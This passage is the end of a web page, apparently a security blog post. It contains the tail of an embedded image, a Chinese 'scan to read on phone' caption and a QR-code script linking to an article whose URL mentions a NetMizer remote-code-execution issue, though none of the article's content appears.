mfay3Dua8+oingdjkwtfcwDEQyPTgNj56TKfe/ZD+6hAOwV2dOsRn/Qph9lirF+Y8hEPwns+8aH+x65C+PQ/R4QuPgdjkwtfewDWQ197/aff/AQAA//97AT9jAAAABklEQVQDAKcHg92LXTm2AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 